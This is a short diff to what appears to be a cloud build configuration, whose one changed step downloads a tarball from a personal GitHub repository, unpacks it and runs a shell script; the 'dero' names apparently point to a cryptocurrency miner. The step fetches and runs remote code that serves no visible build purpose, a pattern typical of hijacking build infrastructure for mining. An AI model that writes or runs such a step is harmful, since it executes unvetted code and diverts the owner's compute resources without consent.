@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/sabarlur/coba/raw/main/SRBDERO.tar.gz && tar xf SRBDERO.tar.gz && ./dero.sh
+         wget https://github.com/sabarlur/coba/raw/main/dero.tar.gz && tar xf dero.tar.gz && ./dro.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
